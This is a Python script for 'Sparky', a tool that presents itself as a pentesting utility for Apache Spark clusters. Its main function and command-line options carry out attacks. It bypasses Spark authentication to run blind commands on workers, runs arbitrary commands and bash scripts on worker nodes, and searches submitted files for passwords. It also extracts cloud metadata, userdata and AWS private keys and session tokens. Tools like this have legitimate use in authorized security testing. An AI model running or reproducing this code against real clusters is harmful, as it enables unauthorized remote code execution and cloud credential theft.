import argparse
from utils.sparkClient import SparkClient
from utils.general import parseListNodes, removeSpaces, whine
from utils.cmd import parseCommandOutput, blindCommandExec
import multiprocessing
import sys, os, signal, base64


def isValidFile(parser, arg):
    if not os.path.exists(arg):
        parser.error("The file %s does not exist!" % arg)
    else:
        return open(arg, "r")  # return an open file handle


def _request_stop(signum, _):
    whine("Shutting down Spark driver", "warn")
    raise SystemExit()


def main(results):
    hostPort = results.spark_master.split(":")
    localIP = results.driver_ip
    appName = results.appName
    username = results.username
    target = hostPort[0]
    port = 7077
    if len(hostPort) > 1:
        port = int(hostPort[1])

    p = multiprocessing.Pool()
    sClient = SparkClient(target, port, localIP, appName, username)
    print("")
    whine(
        "Testing target to confirm a spark master is running on {0}:{1}".format(
            target, port
        ),
        "info",
    )
    sparkConfirmed = sClient.sendHello()
    if not sparkConfirmed:
        whine("Could not confirm the target is running spark", "warn")
    elif sparkConfirmed and sClient.requiresAuthentication:
        whine(
            "Spark master confirmed at {0}:{1} - authentication required".format(
                target, port
            ),
            "warn",
        )
    else:
        whine("Spark master confirmed at {0}:{1}".format(target, port), "good")

    whine("Initializing local Spark driver...This can take a little while", "info")
    if sClient.requiresAuthentication and not (results.secret or results.shotgun):
        whine(
            "Spark is protected with authentication. Either provide a secret (-S) or add --shotgun option when executing a command to bypass authentication",
            "err",
        )
        sys.exit(-1)

    if results.shotgun:
        whine("Performing blind command execution on workers", "info")
        sClient.useShotgun = True
    else:
        sClient.initContext(results.secret)
        print("")

    if results.listNodes:
        parseListNodes(sClient)

    if results.listFiles:
        interpreterArgs = [
            "/bin/bash",
            "-c",
            'find "$(cd ../..; pwd)" -type f -name "{0}" -printf "%M\t%u\t%g\t%6k KB\t%Tc\t%p\n" |grep -v stderr |grep -v stdout'.format(
                results.extension
            ),
        ]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.passwdInFile:
        scriptContent = open("./utils/searchPass.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, results.extension]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.cmd:
        if sClient.useShotgun:
            blindCommandExec(sClient, base64.b64encode(results.cmd))
        else:
            interpreterArgs = [results.cmd]
            parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.script:
        scriptContent = results.script.read()
        if sClient.useShotgun:
            blindCommandExec(sClient, base64.b64encode(scriptContent))
        else:
            interpreterArgs = ["/bin/bash", "-c", scriptContent]
            parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.metadata:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, "metadata"]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.userdata:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, "userdata"]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.privatekey:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, "privatekey"]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _request_stop)
    signal.signal(signal.SIGTERM, _request_stop)

    parser = argparse.ArgumentParser(
        description="Sparky: a tool to pentest Spark clusters"
    )
    parser.add_argument(
        "spark_master",
        help="The master node of a Spark cluster host:port. If no port is provided, default to 7077",
    )
    parser.add_argument(
        "driver_ip", help="Local IP to bind to for communicating with spark workers."
    )

    group_general = parser.add_argument_group("General")
    group_cmd = parser.add_argument_group("Command execution")
    group_cloud = parser.add_argument_group("Cloud environment (AWS, DigitalOcean)")

    group_general.add_argument(
        "-l",
        "--list-nodes",
        help="List of executor nodes",
        action="store_true",
        default=False,
        dest="listNodes",
    )
    group_general.add_argument(
        "-A",
        "--appname",
        help="Name of the app as it will appear in the spark logs",
        default="ML exp",
        dest="appName",
    )
    group_general.add_argument(
        "-U",
        "--username",
        help="Name of the user as it will appear in the spark logs",
        default="lambda",
        dest="username",
    )
    group_general.add_argument(
        "-S",
        "--secret",
        help="Secret to authenticate to Spark master when authentication is required",
        default="",
        dest="secret",
    )

    group_general.add_argument(
        "-f",
        "--list-files",
        help="List of files (jars, py, etc.) submited to a worker - may contain sensitive information",
        action="store_true",
        default=False,
        dest="listFiles",
    )
    group_general.add_argument(
        "-k",
        "--search",
        help="Search for patterns in files submited to a worker. Default Patterns hardcoded in utils/searchPass.py",
        action="store_true",
        default=False,
        dest="passwdInFile",
    )

    group_general.add_argument(
        "-e",
        "--extension",
        help="Performs list and search operations on particular extensions of files submitted to a worker: *.txt, *.jar, *.py. Default: *",
        default="*",
        dest="extension",
    )

    group_cmd.add_argument(
        "-c",
        "--cmd",
        help="Execute a command on one or multiple worker nodes",
        default=False,
        dest="cmd",
    )
    group_cmd.add_argument(
        "-s",
        "--script",
        help="Execute a bash script on one or multiple worker nodes",
        type=lambda x: isValidFile(parser, x),
        default=False,
        dest="script",
    )
    group_cmd.add_argument(
        "-g",
        "--shotgun",
        help="Bypass authentication and execute a command on a random worker nodes",
        action="store_true",
        default=False,
        dest="shotgun",
    )
    group_cmd.add_argument(
        "-n",
        "--num-workers",
        type=int,
        help="Number of workers",
        default=1,
        dest="numWokers",
    )

    group_cloud.add_argument(
        "-u",
        "--user-data",
        help="Gather userdata or custom data information",
        action="store_true",
        default=False,
        dest="userdata",
    )
    group_cloud.add_argument(
        "-m",
        "--meta-data",
        action="store_true",
        help="Gather metadata information from the cloud provider",
        default=False,
        dest="metadata",
    )
    group_cloud.add_argument(
        "-p",
        "--private-key",
        action="store_true",
        help="Extracts AWS private key and session token if a role is attached to the instance (AWS only)",
        default=False,
        dest="privatekey",
    )

    results = parser.parse_args()
    main(results)
